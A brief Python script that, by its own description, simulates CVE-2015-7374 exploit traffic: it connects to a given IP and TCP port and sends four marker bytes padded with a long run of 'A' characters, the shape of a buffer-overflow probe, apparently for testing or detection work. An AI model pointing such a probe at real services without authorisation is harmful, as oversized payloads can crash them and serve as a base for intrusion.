import socket
import argparse

def simulate_exploit(target_ip, target_port, payload_size):
    print(f"[+] Connecting to {target_ip}:{target_port}")

    try:
        # Connect to the target
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))

            # Build the payload
            payload = b"\xDE\xAD\xBE\xEF" + b"A" * payload_size
            print(f"[+] Sending payload of size {len(payload)} bytes...")
            s.sendall(payload)

            # Optionally wait for a response
            try:
                response = s.recv(1024)
                print("[+] Received response:", response)
            except socket.timeout:
                print("[!] No response (timeout)")

    except Exception as e:
        print(f"[!] Failed to connect or send data: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate CVE-2015-7374 exploit traffic")
    parser.add_argument("target_ip", help="Target IP address (e.g. 192.168.1.100)")
    parser.add_argument("-p", "--port", type=int, default=1234, help="Target TCP port (default: 1234)")
    parser.add_argument("-s", "--size", type=int, default=500, help="Payload size in bytes (default: 500)")
    
    args = parser.parse_args()
    simulate_exploit(args.target_ip, args.port, args.size)
